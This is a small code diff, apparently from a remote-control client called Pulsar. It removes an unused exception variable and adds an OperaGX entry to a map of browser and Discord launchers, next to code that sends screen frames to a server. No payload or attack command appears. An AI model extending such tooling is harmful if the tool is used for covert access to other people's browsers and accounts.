@@ -189,7 +189,7 @@ namespace Pulsar.Client.Messages
                         SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
                     Thread.Sleep(100);
                 }
@@ -275,6 +275,7 @@ namespace Pulsar.Client.Messages
                 { "Edge", ProcessHandler.StartEdge },
                 { "Brave", ProcessHandler.StartBrave },
                 { "Opera", ProcessHandler.StartOpera },
+                { "OperaGX", ProcessHandler.StartOperaGX },
                 { "Mozilla", ProcessHandler.StartFirefox },
                 { "Discord", ProcessHandler.StartDiscord }
             };
